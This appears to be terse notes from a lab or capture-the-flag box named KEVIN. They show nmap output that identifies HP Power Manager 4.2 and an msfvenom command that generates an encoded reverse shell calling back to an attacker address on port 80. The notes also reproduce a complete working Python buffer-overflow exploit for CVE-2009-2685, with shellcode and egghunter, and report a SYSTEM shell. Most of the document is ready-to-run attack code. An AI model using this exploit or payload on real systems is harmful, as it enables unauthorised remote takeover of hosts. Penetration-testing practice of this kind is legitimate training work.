```
nmap -sC -sV 192.168.235.45  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 22:48 CDT
Nmap scan report for 192.168.235.45
Host is up (0.045s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.235.45/index.asp
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2023-08-01T03:49:58+00:00; +9s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2023-08-01T03:49:49+00:00
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2023-07-31T03:45:30
|_Not valid after:  2024-01-30T03:45:30
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-01T03:49:49
|_  start_date: 2023-08-01T03:45:53
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 005056bfaca7 (VMware)
|_clock-skew: mean: 1h24m08s, deviation: 3h07m50s, median: 7s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-31T20:49:49-07:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.98 seconds

```

HP Power Manager is currently installed version 4.2

https://www.exploit-db.com/exploits/10099

```
msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.216 LPORT=80 -e x86/alpha_mixed -f c
```

Exploit did not work by default, created new msfvenom reverse shell instead to call back to port 80 which should be open.

```
#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
SHELL = (
"n00bn00b"
"\x89\xe5\xda\xcb\xd9\x75\xf4\x5e\x56\x59\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
"\x42\x75\x4a\x49\x49\x6c\x4d\x38\x6c\x42\x77\x70\x67\x70"
"\x63\x30\x71\x70\x6d\x59\x68\x65\x70\x31\x49\x50\x71\x74"
"\x4c\x4b\x76\x30\x46\x50\x6c\x4b\x72\x72\x44\x4c\x4c\x4b"
"\x52\x72\x35\x44\x6c\x4b\x33\x42\x75\x78\x76\x6f\x58\x37"
"\x42\x6a\x36\x46\x50\x31\x4b\x4f\x4c\x6c\x75\x6c\x45\x31"
"\x73\x4c\x44\x42\x76\x4c\x65\x70\x4f\x31\x5a\x6f\x74\x4d"
"\x53\x31\x7a\x67\x69\x72\x69\x62\x63\x62\x53\x67\x4c\x4b"
"\x53\x62\x34\x50\x6c\x4b\x63\x7a\x67\x4c\x4e\x6b\x50\x4c"
"\x76\x71\x50\x78\x6b\x53\x30\x48\x67\x71\x48\x51\x53\x61"
"\x6c\x4b\x63\x69\x77\x50\x37\x71\x6b\x63\x6e\x6b\x72\x69"
"\x56\x78\x38\x63\x67\x4a\x32\x69\x4c\x4b\x65\x64\x4c\x4b"
"\x56\x61\x6a\x76\x44\x71\x79\x6f\x6e\x4c\x79\x51\x68\x4f"
"\x44\x4d\x35\x51\x4a\x67\x47\x48\x4b\x50\x43\x45\x49\x66"
"\x67\x73\x63\x4d\x4c\x38\x45\x6b\x53\x4d\x67\x54\x44\x35"
"\x6b\x54\x56\x38\x4e\x6b\x56\x38\x46\x44\x57\x71\x78\x53"
"\x55\x36\x4e\x6b\x66\x6c\x62\x6b\x4c\x4b\x63\x68\x45\x4c"
"\x46\x61\x4b\x63\x6e\x6b\x33\x34\x4c\x4b\x47\x71\x7a\x70"
"\x6f\x79\x61\x54\x71\x34\x61\x34\x51\x4b\x61\x4b\x63\x51"
"\x43\x69\x33\x6a\x73\x61\x6b\x4f\x79\x70\x71\x4f\x33\x6f"
"\x61\x4a\x6c\x4b\x32\x32\x68\x6b\x6c\x4d\x63\x6d\x45\x38"
"\x47\x43\x64\x72\x67\x70\x67\x70\x50\x68\x31\x67\x72\x53"
"\x46\x52\x51\x4f\x71\x44\x73\x58\x52\x6c\x31\x67\x75\x76"
"\x36\x67\x79\x6f\x6a\x75\x6c\x78\x7a\x30\x63\x31\x57\x70"
"\x75\x50\x57\x59\x49\x54\x33\x64\x30\x50\x35\x38\x66\x49"
"\x6f\x70\x62\x4b\x33\x30\x6b\x4f\x78\x55\x36\x30\x62\x70"
"\x72\x70\x50\x50\x63\x70\x56\x30\x53\x70\x36\x30\x72\x48"
"\x5a\x4a\x54\x4f\x4b\x6f\x39\x70\x59\x6f\x7a\x75\x4e\x77"
"\x52\x4a\x63\x35\x62\x48\x49\x50\x6e\x48\x44\x6d\x58\x58"
"\x42\x48\x73\x32\x37\x70\x47\x70\x50\x50\x6c\x49\x58\x66"
"\x52\x4a\x62\x30\x62\x76\x30\x57\x55\x38\x4a\x39\x6c\x65"
"\x64\x34\x73\x51\x69\x6f\x48\x55\x6e\x65\x6b\x70\x74\x34"
"\x76\x6c\x79\x6f\x42\x6e\x37\x78\x51\x65\x4a\x4c\x61\x78"
"\x5a\x50\x48\x35\x4d\x72\x56\x36\x4b\x4f\x4b\x65\x42\x48"
"\x61\x73\x32\x4d\x35\x34\x63\x30\x4f\x79\x58\x63\x66\x37"
"\x52\x77\x52\x77\x50\x31\x38\x76\x70\x6a\x57\x62\x66\x39"
"\x31\x46\x39\x72\x39\x6d\x52\x46\x39\x57\x47\x34\x34\x64"
"\x35\x6c\x55\x51\x67\x71\x6e\x6d\x62\x64\x37\x54\x52\x30"
"\x78\x46\x67\x70\x31\x54\x46\x34\x42\x70\x56\x36\x71\x46"
"\x61\x46\x37\x36\x53\x66\x72\x6e\x61\x46\x51\x46\x63\x63"
"\x52\x76\x55\x38\x42\x59\x68\x4c\x57\x4f\x4f\x76\x79\x6f"
"\x4e\x35\x4e\x69\x4b\x50\x42\x6e\x32\x76\x43\x76\x4b\x4f"
"\x74\x70\x52\x48\x74\x48\x6f\x77\x37\x6d\x33\x50\x69\x6f"
"\x38\x55\x4d\x6b\x68\x70\x6e\x55\x49\x32\x63\x66\x50\x68"
"\x4e\x46\x6c\x55\x6d\x6d\x6d\x4d\x49\x6f\x48\x55\x75\x6c"
"\x34\x46\x31\x6c\x64\x4a\x4f\x70\x39\x6b\x4d\x30\x31\x65"
"\x67\x75\x6f\x4b\x63\x77\x67\x63\x52\x52\x32\x4f\x32\x4a"
"\x57\x70\x66\x33\x6b\x4f\x69\x45\x41\x41")

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()
```

Got a reverse shell as system.